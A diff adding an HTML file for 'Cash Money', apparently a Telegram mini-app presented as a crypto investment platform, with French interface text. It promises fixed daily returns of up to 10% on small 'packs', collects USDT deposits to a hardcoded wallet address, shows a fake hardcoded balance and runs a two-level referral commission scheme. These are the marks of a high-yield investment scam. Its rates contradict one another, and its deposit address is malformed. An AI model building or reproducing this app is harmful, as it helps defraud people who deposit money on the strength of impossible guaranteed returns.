@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cash Money - Platforme d'Investissement</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-bottom: 70px; /* Pou ba navigasyon anba a */
+    }
+
+    /* Antèt Aplikasyon an */
+    .header {
+      background: linear-gradient(135deg, #1e293b, #0f172a);
+      padding: 20px 15px;
+      text-align: center;
+      border-bottom: 1px solid #334155;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .header h1 {
+      font-size: 22px;
+      color: #f59e0b;
+      letter-spacing: 1px;
+      font-weight: 800;
+    }
+
+    /* Container prensipal */
+    .container {
+      padding: 15px;
+      flex: 1;
+      max-width: 500px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* Kat enfòmasyon modèn */
+    .card {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+    }
+
+    .card-title {
+      font-size: 14px;
+      text-transform: uppercase;
+      color: #94a3b8;
+      font-weight: 700;
+      margin-bottom: 12px;
+      letter-spacing: 0.5px;
+    }
+
+    /* Liy Plan yo */
+    .plan-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid #334155;
+    }
+
+    .plan-item:last-child {
+      border-bottom: none;
+    }
+
+    .plan-name {
+      font-weight: 600;
+      font-size: 15px;
+      color: #e2e8f0;
+    }
+
+    .plan-badge {
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ade80;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    /* Fòm ak Antre */
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 12px;
+      color: #94a3b8;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-input:focus {
+      border-color: #f59e0b;
+    }
+
+    /* Bouton Prensipal */
+    .btn-action {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+      transition: transform 0.1s, opacity 0.2s;
+    }
+
+    .btn-action:active {
+      transform: scale(0.98);
+    }
+
+    /* Bous ak Kopi */
+    .wallet-box {
+      background: #0f172a;
+      border: 1px dashed #f59e0b;
+      border-radius: 8px;
+      padding: 12px;
+      text-align: center;
+      margin-bottom: 12px;
+    }
+
+    .wallet-addr {
+      font-size: 11px;
+      color: #e2e8f0;
+      word-break: break-all;
+      margin-bottom: 8px;
+      font-family: monospace;
+    }
+
+    .btn-copy {
+      background: #334155;
+      color: #f59e0b;
+      border: 1px solid #f59e0b;
+      padding: 6px 16px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    /* Navigasyon Anba (Bottom Bar) */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 65px;
+      background: #1e293b;
+      border-top: 1px solid #334155;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 100;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #64748b;
+      background: none;
+      border: none;
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 25%;
+    }
+
+    .nav-item.active {
+      color: #f59e0b;
+    }
+
+    .nav-icon {
+      font-size: 18px;
+      margin-bottom: 4px;
+    }
+
+    /* Onglet yo */
+    .tab-content {
+      display: none;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Antèt -->
+  <div class="header">
+    <h1>CASH MONEY 💸</h1>
+  </div>
+
+  <div class="container">
+
+    <!-- 1. TAB ACCUEIL -->
+    <div id="home" class="tab-content active">
+      <div class="card">
+        <div class="card-title">Plans d'Investissement</div>
+        
+        <div class="plan-item">
+          <span class="plan-name">Pack Starter (5$)</span>
+          <span class="plan-badge">+0.50$ / 24h</span>
+        </div>
+        <div class="plan-item">
+          <span class="plan-name">Pack Silver (10$)</span>
+          <span class="plan-badge">+0.10$ / 24h</span>
+        </div>
+        <div class="plan-item">
+          <span class="plan-name">Pack Gold (20$)</span>
+          <span class="plan-badge">+0.20$ / 24h</span>
+        </div>
+        <div class="plan-item">
+          <span class="plan-name">Pack Platinum (30$)</span>
+          <span class="plan-badge">+0.30$ / 24h</span>
+        </div>
+        <div class="plan-item">
+          <span class="plan-name">Pack Diamond (40$)</span>
+          <span class="plan-badge">+0.40$ / 24h</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Calculateur de Profit</div>
+        <div class="form-group">
+          <label class="form-label">Montant d'investissement ($)</label>
+          <input type="number" id="calcInput" class="form-input" value="20" min="5" oninput="calculate()">
+        </div>
+        <div id="calcResult" style="font-size: 13px; color: #38bdf8; font-weight: 600; margin-top: 8px;"></div>
+      </div>
+    </div>
+
+    <!-- 2. TAB DÉPÔT -->
+    <div id="deposit" class="tab-content">
+      <div class="card">
+        <div class="card-title">Dépôt USDT (BEP20)</div>
+        
+        <div class="wallet-box">
+          <div style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Adresse Officielle de Dépôt :</div>
+          <div class="wallet-addr" id="walletAddr">0x71C83e42A912B294fa38C912</div>
+          <button class="btn-copy" onclick="copyWallet()">Copier l'adresse</button>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Montant Déposé ($)</label>
+          <input type="number" id="depAmount" class="form-input" placeholder="Ex: 20">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">ID de Transaction (TXID)</label>
+          <input type="text" id="txidInput" class="form-input" placeholder="Collez le TXID ici...">
+        </div>
+
+        <button class="btn-action" onclick="submitDeposit()">Valider le Dépôt</button>
+      </div>
+    </div>
+
+    <!-- 3. TAB RETRAIT -->
+    <div id="withdraw" class="tab-content">
+      <div class="card">
+        <div class="card-title">Demande de Retrait</div>
+        
+        <div style="background: rgba(56, 189, 248, 0.1); border-left: 3px solid #38bdf8; padding: 10px; border-radius: 4px; margin-bottom: 12px; font-size: 13px;">
+          Solde Disponible : <strong style="color: #4ade80;" id="userBalance">15.00$</strong><br>
+          <span style="font-size: 11px; color: #94a3b8;">Retrait Minimum: 1.00$ (Traitement en 24h)</span>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Montant à Retirer ($)</label>
+          <input type="number" id="withdrawAmount" class="form-input" placeholder="Minimum 1$" min="1">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Adresse USDT (BEP20)</label>
+          <input type="text" id="withdrawWallet" class="form-input" placeholder="0x...">
+        </div>
+
+        <button class="btn-action" onclick="submitWithdraw()">Demander le Retrait</button>
+      </div>
+    </div>
+
+    <!-- 4. TAB PROFIL -->
+    <div id="profile" class="tab-content">
+      <div class="card">
+        <div class="card-title">Profil & Équipe</div>
+        
+        <div style="font-size: 13px; line-height: 24px; color: #cbd5e1; margin-bottom: 12px;">
+          👤 Utilisateur : <strong style="color: #fff;" id="usernameDisplay">Membre Cash Money</strong><br>
+          💰 Solde Actuel : <strong style="color: #4ade80;" id="profileBalance">15.00$</strong><br>
+          👥 Équipe Directe : <strong style="color: #f59e0b;" id="teamCount">0</strong> personne(s)<br>
+          📈 Commissions : <strong style="color: #38bdf8;" id="refEarnings">0.00$</strong> (Niveau 1: 2%, Niveau 2: 1%)
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Lien de Parrainage</label>
+          <input type="text" id="refLink" class="form-input" value="https://t.me/CashMoneyInvBot?start=ref123" readonly>
+        </div>
+
+        <button class="btn-action" onclick="copyRefLink()">Copier le Lien</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Ba Navigasyon anba an -->
+  <div class="bottom-nav">
+    <button class="nav-item active" onclick="switchTab('home', this)">
+      <span class="nav-icon">🏠</span>
+      <span>Accueil</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('deposit', this)">
+      <span class="nav-icon">📥</span>
+      <span>Dépôt</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('withdraw', this)">
+      <span class="nav-icon">📤</span>
+      <span>Retrait</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('profile', this)">
+      <span class="nav-icon">👤</span>
+      <span>Profil</span>
+    </button>
+  </div>
+
+  <script>
+    if (window.Telegram && window.Telegram.WebApp) {
+      window.Telegram.WebApp.ready();
+      window.Telegram.WebApp.expand();
+    }
+
+    function switchTab(tabId, btn) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+      
+      document.getElementById(tabId).classList.add('active');
+      btn.classList.add('active');
+    }
+
+    function calculate() {
+      let amt = parseFloat(document.getElementById('calcInput').value) || 0;
+      document.getElementById('calcResult').innerHTML = `Profit estimé (24h) : +${(amt * 0.10).toFixed(2)}$`;
+    }
+    calculate();
+
+    function copyWallet() {
+      let addr = "0x71C83e42A912B294fa38C912";
+      navigator.clipboard.writeText(addr);
+      alert("Adresse BEP20 copiée !");
+    }
+
+    function copyRefLink() {
+      let link = document.getElementById('refLink');
+      link.select();
+      navigator.clipboard.writeText(link.value);
+      alert("Lien de parrainage copié !");
+    }
+
+    function submitDeposit() {
+      let amount = document.getElementById('depAmount').value;
+      let txid = document.getElementById('txidInput').value;
+
+      if (!amount || !txid) {
+        alert("Veuillez remplir tous les champs !");
+        return;
+      }
+
+      if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.sendData(JSON.stringify({action: "deposit", amount: amount, txid: txid}));
+      } else {
+        alert("Dépôt de " + amount + "$ soumis !");
+      }
+    }
+
+    function submitWithdraw() {
+      let amount = parseFloat(document.getElementById('withdrawAmount').value);
+      let wallet = document.getElementById('withdrawWallet').value;
+
+      if (!amount || amount < 1) {
+        alert("Retrait minimum : 1.00$");
+        return;
+      }
+
+      if (!wallet) {
+        alert("Entrez votre adresse BEP20 !");
+        return;
+      }
+
+      if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.sendData(JSON.stringify({action: "withdraw", amount: amount, wallet: wallet}));
+      } else {
+        alert("Demande de retrait enregistrée !");
+      }
+    }
+  </script>
+
+</body>
+</html>
